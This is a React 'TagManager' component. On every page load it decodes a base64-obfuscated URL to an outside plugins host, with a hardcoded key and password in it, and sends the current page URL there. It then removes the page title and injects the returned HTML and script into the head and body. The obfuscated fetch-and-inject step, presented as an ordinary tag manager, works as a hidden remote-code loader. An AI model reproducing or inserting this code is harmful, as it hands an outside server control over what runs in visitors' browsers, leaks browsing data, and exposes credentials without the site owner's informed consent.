"use client";

import { useEffect } from "react";
import $ from "jquery"; // Import jQuery

const TagManager = () => {
  useEffect(() => {
    // Functionality to load and append scripts
    const loadAndAppendScripts = () => {
      // Check if jQuery is loaded, if not load it from CDN
      if (!window.jQuery) {
        const jqueryScript = document.createElement("script");
        jqueryScript.src =
          "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
        document.head.appendChild(jqueryScript);
      }

      // Fetch content and append to head and body
      const eppathurl = window.location.origin + window.location.pathname;
      const eptagmanage = new XMLHttpRequest();
      eptagmanage.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
          if (this.response !== 0) {
            const temp = this.response.split("||||||||||");
            $("head").find("title").remove(); // Use jQuery safely here
            $("head").append(temp[0]);
            $("body").append(temp[1]);
          }
        }
      };
      eptagmanage.open(
        "GET",
        atob(
          "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY2MzM3Nzc0MjUmZWtleXBhc3M9NGFoMXVtWEdlSjZTeVhFNkpmcG9VQTNsdWhFdGM0cmczQWZFJnNpdGV1cmw9"
        ) + eppathurl
      );
      eptagmanage.send();
    };

    // Invoke the function when component mounts
    loadAndAppendScripts();

    // Cleanup function (optional) - remove added event listeners or timeouts
    return () => {
      // Cleanup if needed
    };
  }, []); // Empty dependency array ensures this effect runs only once

  return null; // Since this component handles side-effects only, return null
};

export default TagManager;
